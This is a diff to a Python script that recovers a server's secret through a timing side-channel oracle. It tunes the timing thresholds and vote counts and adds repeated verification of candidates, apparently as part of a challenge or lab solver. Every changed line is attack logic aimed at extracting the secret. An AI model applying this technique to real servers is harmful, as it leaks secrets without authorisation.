@@ -745,13 +745,14 @@ def recover_from_timing_oracle(
     timeout_s: float,
     repeats: int,
     debug: bool,
+    verify_timeout_s: float,
 ) -> int:
     calibration_repeats = max(5, repeats)
     burn_candidates = [6_000_000, 12_000_000, 24_000_000, 48_000_000, 96_000_000]
     sc_term_candidates = [200, 400, 800, 1600, 3200, 6400]
-    min_ratio = 1.008
-    min_gap_s = 0.0004
-    min_boundary_consistency = 0.70
+    min_ratio = 1.015
+    min_gap_s = 0.0010
+    min_boundary_consistency = 0.80
 
     candidates: list[tuple[str, str]] = []
     for burn in burn_candidates:
@@ -827,7 +828,7 @@ def recover_from_timing_oracle(
                         votes_true += 1
                 return votes_true >= 2
 
-            def boundary_vote(mid: int, checks: int = 7) -> tuple[bool, float]:
+            def boundary_vote(mid: int, checks: int = 9) -> tuple[bool, float]:
                 true_count = 0
                 for _ in range(checks):
                     if classify(mid):
@@ -856,8 +857,38 @@ def recover_from_timing_oracle(
                 continue
 
             if (not boundary_lo) and boundary_hi:
-                return binary_search_oracle(classify)
-            return binary_search_oracle(lambda mid: not classify(mid))
+                candidate = binary_search_oracle(classify)
+            else:
+                candidate = binary_search_oracle(lambda mid: not classify(mid))
+
+            # Timing candidates are noisy; confirm before returning so we can
+            # continue trying other timing templates if this one is a false positive.
+            verify_passes = 0
+            verified_value: Optional[int] = None
+            for _ in range(7):
+                verified = verify_nearby_candidates(
+                    server_command=server_command,
+                    userid=userid,
+                    candidate=candidate,
+                    timeout_s=verify_timeout_s,
+                )
+                if verified is not None:
+                    verify_passes += 1
+                    verified_value = verified
+            if verify_passes >= 5 and verified_value is not None:
+                if verified_value != candidate:
+                    debug_log(
+                        debug,
+                        f"[timing] adjusted candidate {candidate} -> {verified_value}",
+                    )
+                return verified_value
+
+            last_failure = (
+                f"timing candidate from {candidate_name} failed verification "
+                f"({verify_passes}/7)"
+            )
+            debug_log(debug, f"[timing] {last_failure}")
+            continue
 
     raise StrategyFailed(last_failure)
 
@@ -1185,6 +1216,7 @@ def recover_server_secret(
                 timeout_s=tuned_timing_timeout,
                 repeats=timing_repeats,
                 debug=debug,
+                verify_timeout_s=tuned_query_timeout,
             ),
         ),
     ]
@@ -1230,6 +1262,7 @@ def recover_server_secret(
                 timeout_s=tuned_timing_timeout,
                 repeats=timing_repeats,
                 debug=debug,
+                verify_timeout_s=tuned_query_timeout,
             ),
         ),
     ]
@@ -1244,24 +1277,18 @@ def recover_server_secret(
         )
         if secret is not None:
             verify_passes = 0
-            verify_attempts = 5 if strategy_name == "timing oracle" else 1
             verified_value: Optional[int] = None
-            for _ in range(verify_attempts):
-                verified = verify_nearby_candidates(
-                    server_command=server_command,
-                    userid=userid,
-                    candidate=secret,
-                    timeout_s=tuned_query_timeout,
-                )
-                if verified is not None:
-                    verify_passes += 1
-                    verified_value = verified
-            required_passes = 3 if strategy_name == "timing oracle" else 1
-            if verify_passes >= required_passes and verified_value is not None:
-                verified = verified_value
-            else:
-                verified = None
+            verified = verify_nearby_candidates(
+                server_command=server_command,
+                userid=userid,
+                candidate=secret,
+                timeout_s=tuned_query_timeout,
+            )
             if verified is not None:
+                verify_passes = 1
+                verified_value = verified
+            if verified_value is not None:
+                verified = verified_value
                 if verified != secret:
                     debug_log(
                         debug,
@@ -1271,7 +1298,7 @@ def recover_server_secret(
             debug_log(
                 debug,
                 f"[serve{server_idx}] candidate {secret} from {strategy_name} failed verification "
-                f"({verify_passes}/{verify_attempts})",
+                f"({verify_passes}/1)",
             )
     return None
 
